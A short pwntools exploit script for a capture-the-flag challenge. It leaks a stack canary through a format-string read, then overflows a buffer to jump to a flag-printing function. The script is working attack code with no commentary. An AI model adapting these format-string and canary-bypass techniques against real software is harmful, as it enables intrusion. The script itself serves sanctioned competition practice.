from pwn import *

p = remote('shell.actf.co',20701)

def leak_canary(r):
	r.recvuntil("name? ")
	r.sendline("%17$p")
	return int(r.recvline()[18:36],16)


def exploit(r):
	canary = leak_canary(r)
	padd1 = "A" * 56
	padd2 = "A" * 8
	flag = 0x400787
	ret = 0x000000000040060e

	payload = ""
	payload += padd1 
	payload += p64(canary)
	payload += padd2
	payload += p64(ret)
	payload += p64(flag)

	r.recvuntil("me? ")
	raw_input("continue? ")
	r.sendline(payload)
	print r.recvline()
exploit(p)
